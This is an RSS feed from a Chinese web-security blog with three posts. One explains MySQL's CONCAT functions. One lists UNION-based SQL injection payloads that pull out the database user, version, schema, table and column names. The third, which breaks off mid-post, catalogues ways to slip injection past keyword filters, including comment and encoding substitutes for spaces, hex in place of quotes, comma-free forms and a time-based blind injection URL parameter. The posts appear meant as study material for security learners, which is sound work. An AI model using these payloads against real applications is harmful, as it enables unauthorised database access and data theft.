<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>sql - 标签 - zu1k</title><link>https://lgf.im/tags/sql/</link><description>sql - 标签 - zu1k</description><generator>Hugo -- gohugo.io</generator><managingEditor>i@lgf.im (zu1k)</managingEditor><webMaster>i@lgf.im (zu1k)</webMaster><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Sun, 22 Mar 2020 18:23:34 +0000</lastBuildDate><atom:link href="https://lgf.im/tags/sql/" rel="self" type="application/rss+xml"/><item><title>MySQL中几个concat的用法与区别</title><link>https://lgf.im/posts/security/web-security/mysql-concat-concat-ws-group-concat/</link><pubDate>Sun, 22 Mar 2020 18:23:34 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/web-security/mysql-concat-concat-ws-group-concat/</guid><description><![CDATA[<h2 id="讲解与示例">讲解与示例</h2>
<h3 id="concatstr1-str2-">CONCAT(str1, str2, &hellip;)</h3>
<ol>
<li>返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL</li>
<li>参数可以是字段名或具体值</li>
</ol>
<p>注意：</p>
<ol>
<li>如果所有参数均为非二进制字符串，则结果为非二进制字符串</li>
<li>如果自变量中含有任一二进制字符串，则结果为一个二进制字符串</li>
<li>一个数字参数被转化为与之相等的二进制字符串格式</li>
<li>若要避免这种情况，可使用显式类型 cast, 例如： <code>SELECT CONCAT(CAST(int_col AS CHAR), char_col)</code></li>
</ol>
<h4 id="mysql的concat函数可以连接一个或者多个字符串">MySQL的concat函数可以连接一个或者多个字符串</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> concat<span class="o">(</span><span class="s1">&#39;10&#39;</span><span class="o">)</span><span class="p">;</span>
+--------------+
<span class="p">|</span> concat<span class="o">(</span><span class="s1">&#39;10&#39;</span><span class="o">)</span> <span class="p">|</span>
+--------------+
<span class="p">|</span> <span class="m">10</span>   <span class="p">|</span>
+--------------+
<span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
mysql&gt; <span class="k">select</span> concat<span class="o">(</span><span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,<span class="s1">&#39;33&#39;</span><span class="o">)</span><span class="p">;</span>
+------------------------+
<span class="p">|</span> concat<span class="o">(</span><span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,<span class="s1">&#39;33&#39;</span><span class="o">)</span> <span class="p">|</span>
+------------------------+
<span class="p">|</span> <span class="m">112233</span> <span class="p">|</span>
+------------------------+
<span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="mysql的concat函数在连接字符串的时候只要其中一个是null那么将返回null">MySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> concat<span class="o">(</span><span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,null<span class="o">)</span><span class="p">;</span>
+------------------------+
<span class="p">|</span> concat<span class="o">(</span><span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,null<span class="o">)</span> <span class="p">|</span>
+------------------------+
<span class="p">|</span> NULL   <span class="p">|</span>
+------------------------+
<span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="concat_wsseparatorstr1str2">CONCAT_WS(separator,str1,str2,…)</h3>
<p>CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。</p>
<p>注意：</p>
<ol>
<li>参数可以是字段名或具体值</li>
<li>如果分隔符为 NULL，则结果为 NULL。函数会忽略任何分隔符参数后的 NULL 值。（只保留非空值）</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> concat_ws<span class="o">(</span><span class="s1">&#39;&#39;</span>,<span class="s1">&#39;&#39;</span>,<span class="s1">&#39;&#39;</span>,<span class="s1">&#39;33&#39;</span><span class="o">)</span><span class="p">;</span>
+--------------------------+
<span class="p">|</span> concat_ws<span class="o">(</span><span class="s1">&#39;&#39;</span>,<span class="s1">&#39;&#39;</span>,<span class="s1">&#39;&#39;</span>,<span class="s1">&#39;33&#39;</span><span class="o">)</span> <span class="p">|</span>
+--------------------------+
<span class="p">|</span> <span class="m">33</span>                       <span class="p">|</span>
+--------------------------+
<span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.04 sec<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="如连接后以逗号分隔">如连接后以逗号分隔</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> concat_ws<span class="o">(</span><span class="s1">&#39;,&#39;</span>,<span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,<span class="s1">&#39;33&#39;</span><span class="o">)</span><span class="p">;</span>
+-------------------------------+
<span class="p">|</span> concat_ws<span class="o">(</span><span class="s1">&#39;,&#39;</span>,<span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,<span class="s1">&#39;33&#39;</span><span class="o">)</span> <span class="p">|</span>
+-------------------------------+
<span class="p">|</span> 11,22,33 <span class="p">|</span>
+-------------------------------+
<span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="和mysql中concat函数不同的是-concat_ws函数在执行的时候不会因为null值而返回null">和MySQL中concat函数不同的是, concat_ws函数在执行的时候,不会因为NULL值而返回NULL</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> concat_ws<span class="o">(</span><span class="s1">&#39;,&#39;</span>,<span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,NULL<span class="o">)</span><span class="p">;</span>
+-------------------------------+
<span class="p">|</span> concat_ws<span class="o">(</span><span class="s1">&#39;,&#39;</span>,<span class="s1">&#39;11&#39;</span>,<span class="s1">&#39;22&#39;</span>,NULL<span class="o">)</span> <span class="p">|</span>
+-------------------------------+
<span class="p">|</span> 11,22 <span class="p">|</span>
+-------------------------------+
<span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="group_concat-函数">GROUP_CONCAT() 函数</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">group_concat</span><span class="p">([</span><span class="k">DISTINCT</span><span class="p">]</span> <span class="err">要连接的字段</span> <span class="p">[</span><span class="k">Order</span> <span class="k">BY</span> <span class="k">ASC</span><span class="o">/</span><span class="k">DESC</span> <span class="err">排序字段</span><span class="p">]</span> <span class="p">[</span><span class="n">Separator</span> <span class="err">‘分隔符’</span><span class="p">])</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="基本查询">基本查询</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> * from aa<span class="p">;</span>
+------+------+
<span class="p">|</span> id<span class="p">|</span> name <span class="p">|</span>
+------+------+
<span class="p">|</span><span class="m">1</span> <span class="p">|</span> 10<span class="p">|</span>
<span class="p">|</span><span class="m">1</span> <span class="p">|</span> 20<span class="p">|</span>
<span class="p">|</span><span class="m">1</span> <span class="p">|</span> 20<span class="p">|</span>
<span class="p">|</span><span class="m">2</span> <span class="p">|</span> 20<span class="p">|</span>
<span class="p">|</span><span class="m">3</span> <span class="p">|</span> <span class="m">200</span>   <span class="p">|</span>
<span class="p">|</span><span class="m">3</span> <span class="p">|</span> <span class="m">500</span>   <span class="p">|</span>
+------+------+
<span class="m">6</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="以id分组把name字段的值打印在一行逗号分隔默认">以id分组，把name字段的值打印在一行，逗号分隔(默认)</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> id,group_concat<span class="o">(</span>name<span class="o">)</span> from aa group by id<span class="p">;</span>
+------+--------------------+
<span class="p">|</span> id<span class="p">|</span> group_concat<span class="o">(</span>name<span class="o">)</span> <span class="p">|</span>
+------+--------------------+
<span class="p">|</span><span class="m">1</span> <span class="p">|</span> 10,20,20<span class="p">|</span>
<span class="p">|</span><span class="m">2</span> <span class="p">|</span> <span class="m">20</span> <span class="p">|</span>
<span class="p">|</span><span class="m">3</span> <span class="p">|</span> 200,500<span class="p">|</span>
+------+--------------------+
<span class="m">3</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="以id分组把去冗余的name字段的值打印在一行逗号分隔">以id分组，把去冗余的name字段的值打印在一行，逗号分隔</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> id,group_concat<span class="o">(</span>distinct name<span class="o">)</span> from aa group by id<span class="p">;</span>
+------+-----------------------------+
<span class="p">|</span> id<span class="p">|</span> group_concat<span class="o">(</span>distinct name<span class="o">)</span> <span class="p">|</span>
+------+-----------------------------+
<span class="p">|</span><span class="m">1</span> <span class="p">|</span> 10,20<span class="p">|</span>
<span class="p">|</span><span class="m">2</span> <span class="p">|</span> <span class="m">20</span>   <span class="p">|</span>
<span class="p">|</span><span class="m">3</span> <span class="p">|</span> 200,500 <span class="p">|</span>
+------+-----------------------------+
<span class="m">3</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="以id分组把name字段的值打印在一行逗号分隔以name排倒序">以id分组，把name字段的值打印在一行，逗号分隔，以name排倒序</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">mysql&gt; <span class="k">select</span> id,group_concat<span class="o">(</span>name order by name desc<span class="o">)</span> from aa group by id<span class="p">;</span>
+------+---------------------------------------+
<span class="p">|</span> id<span class="p">|</span> group_concat<span class="o">(</span>name order by name desc<span class="o">)</span> <span class="p">|</span>
+------+---------------------------------------+
<span class="p">|</span><span class="m">1</span> <span class="p">|</span> 20,20,10   <span class="p">|</span>
<span class="p">|</span><span class="m">2</span> <span class="p">|</span> 20<span class="p">|</span>
<span class="p">|</span><span class="m">3</span> <span class="p">|</span> 500,200<span class="p">|</span>
+------+---------------------------------------+
<span class="m">3</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="区别">区别</h2>
<p><a href="https://stackoverflow.com/questions/11889391/difference-between-group-concat-and-concat-ws">https://stackoverflow.com/questions/11889391/difference-between-group-concat-and-concat-ws</a></p>
<h3 id="concat_ws">concat_ws</h3>
<p><a href="http://www.w3resource.com/mysql/string-functions/mysql-concat_ws-function.php">http://www.w3resource.com/mysql/string-functions/mysql-concat_ws-function.php</a></p>
<p></p>
<h3 id="group_concat">group_concat</h3>
<p><a href="http://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php">http://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php</a></p>
<p></p>
]]></description></item><item><title>查询重要数据的sql语句</title><link>https://lgf.im/posts/security/web-security/sql-to-select-some-base-info/</link><pubDate>Sun, 14 Oct 2018 18:13:10 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/web-security/sql-to-select-some-base-info/</guid><description><![CDATA[<p>查询用户名，数据库名，数据库版本信息：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,(</span><span class="n">concat_ws</span><span class="p">(</span><span class="nb">char</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span><span class="mi">58</span><span class="p">,</span><span class="mi">32</span><span class="p">),</span><span class="k">user</span><span class="p">(),</span><span class="k">database</span><span class="p">(),</span><span class="k">version</span><span class="p">()))</span> <span class="o">%</span><span class="mi">23</span>
</code></pre></td></tr></table>
</div>
</div><p>查询所有数据库名</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="k">schema_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span>
</code></pre></td></tr></table>
</div>
</div><p>查询一个库中所有的表的名字</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">union</span> <span class="k">select</span> <span class="n">group_concat</span><span class="p">(</span><span class="nb">char</span><span class="p">(</span><span class="mi">32</span><span class="p">),</span><span class="k">table_name</span><span class="p">,</span><span class="nb">char</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span>   <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="mi">0</span><span class="n">x7365637572697479</span>  <span class="o">%</span><span class="mi">23</span>
</code></pre></td></tr></table>
</div>
</div><p>注意。在系统自带的表中查东西，where后面的值应该是单引号包裹或者16进制编码，通常用16进制</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="k">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;my_db&#39;</span>
</code></pre></td></tr></table>
</div>
</div><p>查询一个表中所有列的名字</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">union</span> <span class="k">select</span> <span class="n">group_concat</span><span class="p">(</span><span class="nb">char</span><span class="p">(</span><span class="mi">32</span><span class="p">),</span><span class="k">table_name</span><span class="p">,</span><span class="nb">char</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">COLUMNS</span>   <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="mi">0</span><span class="n">x7365637572697479</span>  <span class="o">%</span><span class="mi">23</span>

<span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="k">column_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;my_db&#39;</span>
</code></pre></td></tr></table>
</div>
</div>]]></description></item><item><title>sql注入针对关键字过滤的绕过技巧</title><link>https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/</link><pubDate>Sun, 14 Oct 2018 18:07:45 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/web-security/bypass-tech-for-sql-injection-keyword-filtering/</guid><description><![CDATA[<p>在sql注入中经常会遇到服务端针对注入关键字进行过滤，经过查询各种文章，总结了一部分绕过的方法。</p>
<blockquote>
<p>2020.08.08更新：增加利用MySQL8.0语法新特性绕过方法，增加sql注入过滤和检测的几种思路和绕过方法</p>
</blockquote>
<h2 id="过滤空格">过滤空格</h2>
<h3 id="使用注释符绕过">使用注释符<code>/**/</code>绕过</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">SELECT</span><span class="cm">/**/</span><span class="n">name</span><span class="cm">/**/</span><span class="k">FROM</span><span class="cm">/**/</span><span class="k">table</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="使用url编码绕过">使用<strong>url编码</strong>绕过</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="o">%</span><span class="n">a0</span> <span class="err">发出去就是空格的意思，但是需要在</span><span class="n">burp中抓包后修改</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="使用浮点数绕过">使用<strong>浮点数</strong>绕过</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">8</span><span class="n">E0union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span>
<span class="err">等价于</span>
<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="使用tab替代空格">使用<strong>Tab</strong>替代空格</h3>
<h3 id="使用两个空格替代一个空格">使用<strong>两个空格</strong>替代一个空格</h3>
<h3 id="使用括号绕过">使用<strong>括号</strong>绕过</h3>
<p>如果空格被过滤，括号没有被过滤，可以用括号绕过。
在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p>
<p>例如：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span><span class="p">(</span><span class="k">user</span><span class="p">())</span><span class="k">from</span> <span class="n">dual</span> <span class="k">where</span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="k">and</span><span class="p">(</span><span class="mi">2</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>这种过滤方法常常用于time based盲注,例如：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">%</span><span class="mi">27</span><span class="k">and</span><span class="p">(</span><span class="n">sleep</span><span class="p">(</span><span class="n">ascii</span><span class="p">(</span><span class="n">mid</span><span class="p">(</span><span class="k">database</span><span class="p">()</span><span class="k">from</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="k">for</span><span class="p">(</span><span class="mi">1</span><span class="p">)))</span><span class="o">=</span><span class="mi">109</span><span class="p">))</span><span class="o">%</span><span class="mi">23</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="过滤引号">过滤引号</h2>
<h3 id="使用16进制绕过">使用<strong>16进制</strong>绕过</h3>
<p>会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="k">column_name</span>  <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="k">table_name</span><span class="o">=</span><span class="s2">&#34;users&#34;</span>
</code></pre></td></tr></table>
</div>
</div><p>这个时候如果引号被过滤了，那么上面的<code>where</code>子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。
<code>users</code>的十六进制的字符串是<code>7573657273</code>。那么最后的sql语句就变为了：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="k">column_name</span>  <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">where</span> <span class="k">table_name</span><span class="o">=</span><span class="mi">0</span><span class="n">x7573657273</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="过滤逗号">过滤逗号</h2>
<h3 id="使用from关键字绕过">使用<strong>from关键字</strong>绕过</h3>
<p>对于<code>substr()</code>和<code>mid()</code>这两个方法可以使用<code>from to</code>的方式来解决：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">()</span> <span class="k">from</span> <span class="mi">1</span> <span class="k">for</span> <span class="mi">1</span><span class="p">);</span>
<span class="k">select</span> <span class="n">mid</span><span class="p">(</span><span class="k">database</span><span class="p">()</span> <span class="k">from</span> <span class="mi">1</span> <span class="k">for</span> <span class="mi">1</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="使用join关键字绕过">使用<strong>join关键字</strong>绕过</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">union</span> <span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span>
<span class="err">等价于</span>
<span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span><span class="p">)</span><span class="n">a</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">2</span><span class="p">)</span><span class="n">b</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="使用like关键字绕过">使用<strong>like关键字</strong>绕过</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="n">ascii</span><span class="p">(</span><span class="n">mid</span><span class="p">(</span><span class="k">user</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">80</span>   <span class="o">#</span><span class="err">等价于</span>
<span class="k">select</span> <span class="k">user</span><span class="p">()</span> <span class="k">like</span> <span class="s1">&#39;r%&#39;</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="使用offset关键字绕过">使用<strong>offset关键字</strong>绕过</h3>
<p>对于limit可以使用offset来绕过：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">news</span> <span class="k">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span>
<span class="err">等价于</span>
<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">news</span> <span class="k">limit</span> <span class="mi">1</span> <span class="k">offset</span> <span class="mi">0</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="过滤注释符--和----">过滤注释符（ <code>#</code> 和 <code>--</code> ）</h2>
<h3 id="手动闭合引号不使用注释符">手动闭合引号，不使用注释符</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,3||&#39;</span><span class="mi">1</span>
</code></pre></td></tr></table>
</div>
</div><p>或者：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,&#39;</span><span class="mi">3</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="过滤比较符号---和--">过滤比较符号 （ <code>&lt;</code> 和 <code>&gt;</code> ）</h2>
<h3 id="使用greatestleast函数绕过">使用**<code>greatest()</code>、<code>least（）</code>函数**绕过</h3>
<p>greatest()、least（）：（前者返回最大值，后者返回最小值）</p>
<p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了</p>
<p>最常见的一个盲注的sql语句：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
